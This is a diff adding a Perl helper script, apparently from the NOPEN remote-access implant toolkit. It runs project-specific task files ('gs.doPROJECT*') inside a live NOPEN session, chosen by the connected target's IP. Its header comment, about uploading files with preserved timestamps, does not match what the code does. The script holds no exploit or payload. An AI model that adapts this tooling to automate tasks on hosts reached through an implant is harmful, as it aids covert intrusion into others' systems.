@@ -1,0 +1,125 @@
+#!/usr/bin/env perl
+## NOPEN autoport script to upload a file, preserving the 
+## mtime/atime stamps of the destination directory with
+## -ls -n and -touch -t.
+$VER="1.0.0.4" ;
+#use File::Basename qw(basename dirname);
+use File::Basename ;
+myinit() ;
+#############################
+# Do the project specific script
+#############################
+
+sub doprojectname {
+  $gotone=0;
+  foreach $name (split(/\n/,`find $opetc/gs.do* | grep -i "etc/gs.do$projectname"`)) {
+    if (($ip) = $name =~ /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/) {
+      next unless $ip eq $nopen_myip;
+    }
+    `dos2unix $name 2>&1`;
+    ($output,$nopenlines,@output) = doit("-gs $name");
+    $gotone++;
+  }
+
+  mywarn("No files matching $opetc/gs.do$projectname\* (case insensitive)")
+    unless $gotone;
+}
+
+doprojectname() unless $skiprest;
+
+# End with true value as we require this script elsewhere.
+1;
+
+sub myinit {
+  # If $willautoport is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $calledviarequire = 0;
+  $skiprest = 0;
+  if ($willautoport and $socket) {
+    progprint("$prog called -gs doproject @ARGV");
+    $calledviarequire = 1;
+  } else {
+    $willautoport=1;
+    my $autoutils = "../etc/autoutils" ;
+    unless (-e $autoutils) {
+      $autoutils = "/current/etc/autoutils" ;
+    }
+    require $autoutils;
+    $prog = "-gs doproject";
+    $vertext = "$prog version $VER\n" ;
+    mydie("No user servicable parts inside.\n".
+	  "(I.e., noclient calls $prog, not you.)\n".
+	  "$vertext") unless ($nopen_rhostname and $nopen_mylog and
+			      -e $nopen_mylog);
+  }
+  $ext = "$$";
+  mydie("bad option(s)") if (! Getopts( "hv" ) ) ;
+  my $currently = "";
+  $currently .= "\t\$projectname = $projectname\n"
+    if ($projectname);
+  $currently .= "\t\$nopen_mypid = $nopen_mypid\n"
+    if ($nopen_mypid);
+  $currently .= "\t\$nopen_myip  = $nopen_myip\n"
+    if ($nopen_myip);
+  $currently = "Currently, these variables are defined for $nopen_rhostname:\n\n".
+    $currently if $currently;
+  $usagetext="
+Usage: $prog [-h]                       (prints this usage statement)
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session via when \"$prog\" is used.
+
+";
+  $gsusagetext="Usage: $prog [IP-ADDRESS]
+
+$prog runs one or more project specific tasks as determined by
+the files $opetc/gs.doPROJECT*, where PROJECT is a (case
+insensitive) match to the variable: \$projectname{\$nopen_myip}
+                     as defined in: $optmp/noclient.info.\$nopen_mypid
+which is made by autoscriptcheck.
+
+A file called gs.doPROJECT.*IP*, for some IP address, it is only
+executed during connections that match both the PROJECT and the IP.
+
+If an IP argument address is provided, that is used instead of
+\$nopen_myip, which is useful if the IP in $opbin/varkeys is not
+a match to the one to which we are currently connected.
+
+SOME NOTES:
+   \$projectname{\$nopen_myip} is defined to be \"PROJECT\" if
+   $opbin/varkeys/PROJECT contains a directory ending in
+   the IP of the current NOPEN server.
+
+   If you have gs.doPROJECT* files in your OPS/userOverrides when
+   you build, they will automatically get included.
+
+   $prog is run automatically during autodone.
+
+${currently}
+";
+  $usethisip = shift(@ARGV);
+  usage() if ($opt_h or $opt_v or @ARGV) ;
+  if ($usethisip) {
+    mydie("Invalid IP $usethisip")
+      unless ipcheck($usethisip);
+    $nopen_myip = $usethisip;
+  }
+  mydie("\n\n\n$prog requires NOPEN 3.0.3.2 or greater (with autoport)\n")
+    unless($nopen_autoport);
+
+  if (!($projectname{$nopen_myip})) {
+    progprint(".\n\n".
+              "\n${COLOR_FAILURE}\$projectname{$nopen_myip} not defined,\n".
+	      "\t\t\t\t\t\tis $opbin/varkeys complete?${COLOR_NORMAL}\n\n");
+    $skiprest=1;
+  }
+  else { 
+    $projectname=$projectname{$nopen_myip};
+  }
+  # If $socket is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $socket = pilotstart(quiet) unless $socket;
+}#myinit
+
+
